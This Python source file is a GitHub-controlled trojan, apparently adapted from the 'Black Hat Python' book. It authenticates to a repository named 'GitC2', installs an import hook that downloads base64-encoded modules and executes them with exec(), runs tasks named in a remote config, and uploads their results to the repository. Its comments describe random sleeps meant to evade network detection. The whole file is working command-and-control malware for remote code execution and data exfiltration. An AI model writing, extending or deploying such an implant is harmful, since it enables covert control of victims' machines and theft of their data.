import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

# The following 2 functions handle the interaction with the GitHub Repository.
# This one reads the token created on local machine for authentication. Can create different tokens per trojan.
def github_connect():
    with open('mytoken.txt') as f:
        token = f.read().strip()
    user = 'ClickBeights'
    sess = github3.login(token=token)
    return sess.repository(user, 'GitC2')

# Fetch a file from GitHub and return its Base64 content string.
def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

'''
    Had to rewrite this class. Essentially I tried to make as small changes as possible and preserve the code from the 
    BHP-2ED book, but as with the rest of the scripts, it was messy, I had to replace (find_module and load_module) 
    with (find_spec, create_module, and exec_module) as I found this to be the modernized way of reading remote modules.
'''
class GitImporter:
    def __init__(self):
        self.current_module_code = None
        self.repo = None

    # This method locates the module using Modern Python3 Hook API mechanism (find_spec > find_module).
    def find_spec(self, fullname, path, target=None):
        print(f"[*] Attempting to retrieve {fullname}...")
        self.repo = github_connect()

        # Pass it to remote file loader.
        new_library = get_file_contents('modules', f'{fullname}.py', self.repo)

        # If we located the module in the repository:
        if new_library is not None:
            # Base64 decode the content and store it in the Class. (GitHub gives Base64 encoded data).
            self.current_module_code = base64.b64decode(new_library)
            spec = importlib.util.spec_from_loader(fullname, loader=self)
            # By returning spec, we indicate to the python interpreter that we found the module & to load it.
            return spec
        return None

    # This method is part of Python’s importlib loader protocol. It can be dropped entirely.
    def create_module(self, spec):
        # Use default module creation semantics
        return None

    # This method executes the module using Modern Python3 Hook API mechanism (exec_module > load_module).
    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)

#---The main Trojaning class.
class Trojan:
    # Initialize Trojan object.
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    # Retrieves the remote configuration document from the repo so the trojan knows what to run.
    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config

    # This method calls the 'run' function of the module just imported.
    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    # This one creates a file whose name include current date & time and saves content in it.
    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        # Removed the encoding 'base64.b64encode(bindata)' to view clear text results on GitHub.
        self.repo.create_file(remote_path, message, bindata)

    # This method gets called by 'module_runner' to run tasks from a specific module then sleeps.
    def run(self):
        while True:
            # Grab the configuration file from repository.
            config = self.get_config()
            for task in config:
                # Start the module in its own thread.
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1, 10))
            # Sleep a random amount of time to evade network analysis detection.
            time.sleep(random.randint(30*60, 3*60*60))

if __name__ == '__main__':
    # insert at front, so it gets first chance
    sys.meta_path.insert(0, GitImporter())
    trojan = Trojan('abc')
    trojan.run()
